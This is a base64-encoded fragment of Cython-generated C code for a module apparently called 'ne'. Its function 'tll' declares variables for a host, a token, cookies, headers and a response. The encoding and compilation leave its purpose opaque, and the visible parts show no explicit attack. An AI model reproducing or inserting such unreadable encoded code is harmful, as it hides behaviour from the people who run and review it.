UHlfc3NpemVfdCBfX3B5eF90ZW1wID0gX19QeXhfUHlUdXBsZV9HRVRfU0laRShfX3B5eF90XzEpOwogICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgICAgaWYgKHVubGlrZWx5KChfX3B5eF90ZW1wIDwgMCkpKSBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MMV9lcnJvcikKICAgICAgICAgICNlbmRpZgogICAgICAgICAgaWYgKF9fcHl4X3RfMiA+PSBfX3B5eF90ZW1wKSBicmVhazsKICAgICAgICB9CiAgICAgICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICAgICAgX19weXhfdF80ID0gX19QeXhfTmV3UmVmKFB5VHVwbGVfR0VUX0lURU0oX19weXhfdF8xLCBfX3B5eF90XzIpKTsKICAgICAgICAjZWxzZQogICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShfX3B5eF90XzEsIF9fcHl4X3RfMik7CiAgICAgICAgI2VuZGlmCiAgICAgICAgKytfX3B5eF90XzI7CiAgICAgIH0KICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MMV9lcnJvcikKICAgIH0gZWxzZSB7CiAgICAgIF9fcHl4X3RfNCA9IF9fcHl4X3RfMyhfX3B5eF90XzEpOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIHsKICAgICAgICBQeU9iamVjdCogZXhjX3R5cGUgPSBQeUVycl9PY2N1cnJlZCgpOwogICAgICAgIGlmIChleGNfdHlwZSkgewogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXhjX3R5cGUsIFB5RXhjX1N0b3BJdGVyYXRpb24pKSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDFfZXJyb3IpCiAgICAgICAgICBQeUVycl9DbGVhcigpOwogICAgICAgIH0KICAgICAgICBicmVhazsKICAgICAgfQogICAgfQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X2N1cl9zY29wZS0+X19weXhfdl9pKTsKICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X2N1cl9zY29wZS0+X19weXhfdl9pLCBfX3B5eF90XzQpOwogICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzQpOwogICAgX19weXhfdF80ID0gMDsKICAgIF9fcHl4X3RfNSA9IE5VTEw7CiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NjKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV95eSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgIF9fcHl4X3RfOCA9IDE7CiAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF82KSkpIHsKICAgICAgX19weXhfdF81ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF82KTsKICAgICAgYXNzZXJ0KF9fcHl4X3RfNSk7CiAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF82KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNiwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19weXhfdF84ID0gMDsKICAgIH0KICAgICNlbmRpZgogICAgewogICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBfX3B5eF90Xzd9OwogICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDItX19weXhfdF84KSB8IChfX3B5eF90XzgqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMTQsIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgIH0KICAgIGlmICh1bmxpa2VseShfX1B5eF9MaXN0Q29tcF9BcHBlbmQoX19weXhfciwgKFB5T2JqZWN0KilfX3B5eF90XzQpKSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoX19weXhfY3VyX3Njb3BlKTsKCiAgCiAgZ290byBfX3B5eF9MMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTsgX19weXhfciA9IDA7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsKICBpZiAoX19QeXhfUHlFcnJfT2NjdXJyZWQoKSkgewogICAgX19QeXhfR2VuZXJhdG9yX1JlcGxhY2VfU3RvcEl0ZXJhdGlvbigwKTsKICAgIF9fUHl4X0FkZFRyYWNlYmFjaygiZ2VuZXhwciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIH0KICBfX3B5eF9MMDo7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgI2lmICFDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgX19QeXhfQ29yb3V0aW5lX1Jlc2V0QW5kQ2xlYXJFeGNlcHRpb24oX19weXhfZ2VuZXJhdG9yKTsKICAjZW5kaWYKICBfX3B5eF9nZW5lcmF0b3ItPnJlc3VtZV9sYWJlbCA9IC0xOwogIF9fUHl4X0Nvcm91dGluZV9jbGVhcigoUHlPYmplY3QqKV9fcHl4X2dlbmVyYXRvcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8ybmVfM3RsbF84Z2VuZXJhdG9yMihfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKTsgCgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMm5lXzN0bGxfNmdlbmV4cHIoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X2dlbmV4cHJfYXJnXzApIHsKICBzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICpfX3B5eF9jdXJfc2NvcGU7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZ2VuZXhwciIsIDApOwogIF9fcHl4X2N1cl9zY29wZSA9IChzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICopX19weXhfdHBfbmV3XzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3B0eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSwgTlVMTCk7CiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUpKSB7CiAgICBfX3B5eF9jdXJfc2NvcGUgPSAoKHN0cnVjdCBfX3B5eF9vYmpfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKilQeV9Ob25lKTsKICAgIF9fUHl4X0lOQ1JFRihQeV9Ob25lKTsKICAgIF9fUFlYX0VSUigwLCAxMTUsIF9fcHl4X0wxX2Vycm9yKQogIH0gZWxzZSB7CiAgICBfX1B5eF9HT1RSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTsKICB9CiAgX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wID0gX19weXhfZ2VuZXhwcl9hcmdfMDsKICBfX1B5eF9JTkNSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTsKICBfX1B5eF9HSVZFUkVGKF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCk7CiAgewogICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSBfX1B5eF9HZW5lcmF0b3JfTmV3KChfX3B5eF9jb3JvdXRpbmVfYm9keV90KSBfX3B5eF9nYl8ybmVfM3RsbF84Z2VuZXJhdG9yMiwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzJdKSwgKFB5T2JqZWN0ICopIF9fcHl4X2N1cl9zY29wZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90bGxfbG9jYWxzX2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9uZSk7IGlmICh1bmxpa2VseSghZ2VuKSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9ERUNSRUYoX19weXhfY3VyX3Njb3BlKTsKICAgIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogICAgcmV0dXJuIChQeU9iamVjdCAqKSBnZW47CiAgfQoKICAKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJuZS50bGwuZ2VuZXhwciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fcHl4X3IgPSBOVUxMOwogIF9fUHl4X0RFQ1JFRigoUHlPYmplY3QgKilfX3B5eF9jdXJfc2NvcGUpOwogIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X2diXzJuZV8zdGxsXzhnZW5lcmF0b3IyKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19weXhfZ2VuZXJhdG9yLCBDWVRIT05fVU5VU0VEIFB5VGhyZWFkU3RhdGUgKl9fcHl4X3RzdGF0ZSwgUHlPYmplY3QgKl9fcHl4X3NlbnRfdmFsdWUpIAp7CiAgc3RydWN0IF9fcHl4X29ial8ybmVfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqX19weXhfY3VyX3Njb3BlID0gKChzdHJ1Y3QgX19weXhfb2JqXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICopX19weXhfZ2VuZXJhdG9yLT5jbG9zdXJlKTsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMSA9IE5VTEw7CiAgUHlfc3NpemVfdCBfX3B5eF90XzI7CiAgUHlPYmplY3QgKigqX19weXhfdF8zKShQeU9iamVjdCAqKTsKICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF82ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDsKICBzaXplX3QgX19weXhfdF84OwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZ2VuZXhwciIsIDApOwogIHN3aXRjaCAoX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwpIHsKICAgIGNhc2UgMDogZ290byBfX3B5eF9MM19maXJzdF9ydW47CiAgICBkZWZhdWx0OiAKICAgIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogICAgcmV0dXJuIE5VTEw7CiAgfQogIF9fcHl4X0wzX2ZpcnN0X3J1bjo7CiAgaWYgKHVubGlrZWx5KCFfX3B5eF9zZW50X3ZhbHVlKSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDFfZXJyb3IpCiAgX19weXhfciA9IFB5TGlzdF9OZXcoMCk7IGlmICh1bmxpa2VseSghX19weXhfcikpIF9fUFlYX0VSUigwLCAxMTUsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF9yKTsKICBpZiAodW5saWtlbHkoIV9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCkpIHsgX19QeXhfUmFpc2VVbmJvdW5kTG9jYWxFcnJvcigiLjAiKTsgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDFfZXJyb3IpIH0KICBpZiAobGlrZWx5KFB5TGlzdF9DaGVja0V4YWN0KF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCkpIHx8IFB5VHVwbGVfQ2hlY2tFeGFjdChfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB7CiAgICBfX3B5eF90XzEgPSBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzA7IF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpOwogICAgX19weXhfdF8yID0gMDsKICAgIF9fcHl4X3RfMyA9IE5VTEw7CiAgfSBlbHNlIHsKICAgIF9fcHl4X3RfMiA9IC0xOyBfX3B5eF90XzEgPSBQeU9iamVjdF9HZXRJdGVyKF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICAgIF9fcHl4X3RfMyA9IChDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJKSA/IFB5SXRlcl9OZXh0IDogX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKF9fcHl4X3RfMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDFfZXJyb3IpCiAgfQogIGZvciAoOzspIHsKICAgIGlmIChsaWtlbHkoIV9fcHl4X3RfMykpIHsKICAgICAgaWYgKGxpa2VseShQeUxpc3RfQ2hlY2tFeGFjdChfX3B5eF90XzEpKSkgewogICAgICAgIHsKICAgICAgICAgIFB5X3NzaXplX3QgX19weXhfdGVtcCA9IF9fUHl4X1B5TGlzdF9HRVRfU0laRShfX3B5eF90XzEpOwogICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgICAgaWYgKHVubGlrZWx5KChfX3B5eF90ZW1wIDwgMCkpKSBfX1BZWF9FUlIoMCwgMTE1LCBfX3B5eF9MMV9lcnJvcikKICAgICAgICAgICNlbmRpZgogICAgICAgICAgaWYgKF9fcHl4X3RfMiA+PSBfX3B5eF90ZW1wKSBicmVhazsKICAgICAgICB9CiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYoX19weXhfdF8xLCBfX3B5eF90XzIpOwogICAgICAgICsrX19weXhfdF8yOwogICAgICB9IGVsc2UgewogICAgICAgIHsKICAgICAgICAgIFB5X3NzaXplX3QgX19weXhfdGVtcCA9IF9fUHl4X1B5VHVwbGVfR0VUX1NJWkUoX19weXhfdF8xKTsKICAgICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICAgIGlmICh1bmxpa2VseSgoX19weXhfdGVtcCA8IDApKSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDFfZXJyb3IpCiAgICAgICAgICAjZW5kaWYKICAgICAgICAgIGlmIChfX3B5eF90XzIgPj0gX19weXhfdGVtcCkgYnJlYWs7CiAgICAgICAgfQogICAgICAgICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X05ld1JlZihQeVR1cGxlX0dFVF9JVEVNKF9fcHl4X3RfMSwgX19weXhfdF8yKSk7CiAgICAgICAgI2Vsc2UKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oX19weXhfdF8xLCBfX3B5eF90XzIpOwogICAgICAgICNlbmRpZgogICAgICAgICsrX19weXhfdF8yOwogICAgICB9CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDFfZXJyb3IpCiAgICB9IGVsc2UgewogICAgICBfX3B5eF90XzQgPSBfX3B5eF90XzMoX19weXhfdF8xKTsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSB7CiAgICAgICAgUHlPYmplY3QqIGV4Y190eXBlID0gUHlFcnJfT2NjdXJyZWQoKTsKICAgICAgICBpZiAoZXhjX3R5cGUpIHsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGV4Y190eXBlLCBQeUV4Y19TdG9wSXRlcmF0aW9uKSkpIF9fUFlYX0VSUigwLCAxMTUsIF9fcHl4X0wxX2Vycm9yKQogICAgICAgICAgUHlFcnJfQ2xlYXIoKTsKICAgICAgICB9CiAgICAgICAgYnJlYWs7CiAgICAgIH0KICAgIH0KICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3ZfaSk7CiAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3ZfaSwgX19weXhfdF80KTsKICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF80KTsKICAgIF9fcHl4X3RfNCA9IDA7CiAgICBfX3B5eF90XzUgPSBOVUxMOwogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jYyk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDExNSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfeXkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxMTUsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICBfX3B5eF90XzggPSAxOwogICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNikpKSB7CiAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7CiAgICAgIGFzc2VydChfX3B5eF90XzUpOwogICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzYsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fcHl4X3RfOCA9IDA7CiAgICB9CiAgICAjZW5kaWYKICAgIHsKICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfdF83fTsKICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF82LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzgsICgyLV9fcHl4X3RfOCkgfCAoX19weXhfdF84Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTE1LCBfX3B5eF9MMV9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICB9CiAgICBpZiAodW5saWtlbHkoX19QeXhfTGlzdENvbXBfQXBwZW5kKF9fcHl4X3IsIChQeU9iamVjdCopX19weXhfdF80KSkpIF9fUFlYX0VSUigwLCAxMTUsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKF9fcHl4X2N1cl9zY29wZSk7CgogIAogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfcik7IF9fcHl4X3IgPSAwOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7CiAgaWYgKF9fUHl4X1B5RXJyX09jY3VycmVkKCkpIHsKICAgIF9fUHl4X0dlbmVyYXRvcl9SZXBsYWNlX1N0b3BJdGVyYXRpb24oMCk7CiAgICBfX1B5eF9BZGRUcmFjZWJhY2soImdlbmV4cHIiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICB9CiAgX19weXhfTDA6OwogIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpOwogICNpZiAhQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwogIF9fUHl4X0Nvcm91dGluZV9SZXNldEFuZENsZWFyRXhjZXB0aW9uKF9fcHl4X2dlbmVyYXRvcik7CiAgI2VuZGlmCiAgX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwgPSAtMTsKICBfX1B5eF9Db3JvdXRpbmVfY2xlYXIoKFB5T2JqZWN0KilfX3B5eF9nZW5lcmF0b3IpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMm5lXzJ0bGwoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZikgewogIFB5T2JqZWN0ICpfX3B5eF92X24xID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9uMiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfaG9zdCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfaGUzID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9yZXMxID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl90b2sgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2Nvb2tpZXMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2hlYWRlcnMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2RhdGEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X3Jlc3BvbnNlID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl90bCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X2diXzJuZV8zdGxsXzJnZW5lcmF0b3IgPSAwOwogIFB5T2JqZWN0ICpfX3B5eF9nYl8ybmVfM3RsbF81Z2VuZXJhdG9yMSA9IDA7CiAgUHlPYmplY3QgKl9fcHl4X2diXzJuZV8zdGxsXzhnZW5lcmF0b3IyID0gMDsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF82ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF84ID0gTlVMTDsKICBzaXplX3QgX19weXhfdF85OwogIFB5T2JqZWN0ICpfX3B5eF90XzEwID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xMVsxMV07CiAgUHlPYmplY3QgKl9fcHl4X3RfMTIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEzID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xNCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzE2ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xN1s0XTsKICBQeU9iamVjdCAqX19weXhfdF8xOCA9IE5VTEw7CiAgaW50IF9fcHl4X3RfMTk7CiAgaW50IF9fcHl4X3RfMjA7CiAgaW50IF9fcHl4X3RfMjE7CiAgaW50IF9fcHl4X3RfMjI7CiAgY2hhciBjb25zdCAqX19weXhfdF8yMzsKICBQeU9iamVjdCAqX19weXhfdF8yNCA9IE5VTEw7CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgidGxsIiwgMCk7C